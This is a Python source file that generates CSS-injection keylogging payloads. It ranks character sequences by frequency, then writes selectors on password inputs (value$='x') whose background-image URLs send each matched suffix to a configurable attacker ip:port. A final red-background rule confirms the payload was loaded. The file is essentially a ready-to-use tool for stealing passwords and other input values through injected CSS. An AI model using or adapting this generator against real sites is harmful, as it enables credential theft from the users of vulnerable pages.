import math, logging

def generate_keys(json_obj: any, num_selectors: int, logger = None) -> list:
    # Defined in https://www.w3.org/TR/CSS21/syndata.html#characters
    '''
    {
        "1": {
            "1": 661586,
            "2": 462186,
            "3": 276015,
        },
        "2": {...},
        "3": {...},
    }
    '''
    combinations = [int(k) for k in json_obj.keys()]
    combinations.sort()
    assert 1 in combinations, "Size '1' must be present in the JSON file"

    # Convert every combination to a list of characters sorted by frequency (descending)
    for k in combinations:
        # Sort by frequency (descending)
        json_obj[str(k)] = sorted(json_obj[str(k)].items(), key=lambda x: x[1], reverse=True)
        # Convert to list of characters
        json_obj[str(k)] = [x[0] for x in json_obj[str(k)]]

    total_combinations = sum(len(json_obj[str(k)]) for k in combinations)
    if logger and total_combinations < num_selectors:
        logger.warning(f"Total number of combinations ({total_combinations}) is less than the limit ({num_selectors}) of selectors. Consider increasing the amount of characters to analyze")

    keys = []
    # top_most is a multiplier for the amount of characters to add
    # 100 % of 1-character combinations, 50 % of 2-character combinations, 25 % of 3-character combinations, etc.
    top_most, s_limit = 1, num_selectors

    # Edgecase: More characters than selectors
    if len(json_obj["1"]) > s_limit:
        # Only add 1-character combinations
        if logger and s_limit >= 8000:
            logger.warning(f"Number of 1-character combinations ({len(json_obj['1'])}) exceeds the limit ({s_limit}). Consider reducing the amount of characters to analyze")
        return json_obj["1"][:s_limit]

    # Add all combinations until the limit is reached
    for k in combinations:
        remaining = s_limit - len(keys)
        if remaining <= 0:
            break
        amount = min(remaining, math.ceil(len(json_obj[str(k)]) * top_most))
        if logger:
            logger.debug(f"Adding {amount} {k}-character combinations")
        keys.extend(json_obj[str(k)][:amount])
        top_most *= 0.5

    return keys

def generate_payload(keys: list, num_selectors: int = 5000, element: str = "input", attribute: str = "value", e_type: str = None, ip: str = "127.0.0.1", port: int = 8000) -> str:
    '''
    input[type="password"][value$="x"] {
        background-image: url("http://127.0.0.1:8000/?k=x");
    }
    '''
    # This is a mess
    type_selector = f"[type='{e_type}']" if e_type else ""
    url = f"http://{ip}:{port}/?k={{3}}"
    selector = f"{element}{type_selector}[{attribute}$='{{2}}']"
    selector += f"{{0}} background-image: url('{url}'); {{1}}\n"

    # Build payload
    payload = ""
    for k in generate_keys(keys, num_selectors):
        # Split into list of characters and convert to hex unicode value
        k = [format(ord(c), 'x') for c in k]
        char_selector = "\\" + "\\".join(k)
        # comma-separated list of character codes
        char_url = ",".join(k)
        payload += selector.format("{", "}", char_selector, char_url)
    # Visualize that the payload had been received and read by the useragent
    payload += "body{background-color: red;}"

    return payload